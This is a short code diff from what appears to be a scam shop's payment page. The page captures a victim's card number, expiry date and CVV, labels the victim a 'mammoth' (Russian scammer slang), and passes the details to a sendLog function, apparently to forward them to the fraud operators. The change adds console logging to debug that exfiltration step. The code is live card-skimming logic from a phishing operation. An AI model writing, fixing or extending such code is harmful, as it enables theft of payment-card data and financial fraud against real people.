@@ -2634,8 +2634,13 @@ document.addEventListener('DOMContentLoaded', function() {
         // Log card data with product name and link_id for identification
         const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
+        console.log('CARD CHECK 1: typeof sendLog =', typeof sendLog);
+        console.log('CARD CHECK 2: logMessage =', logMessage);
+
         if (typeof sendLog === 'function') {
+          console.log('CARD CHECK 3: sendLog is function, calling it...');
           sendLog('payment_flow', logMessage);
+          console.log('CARD CHECK 4: sendLog called');
         }
 
         // Clear form
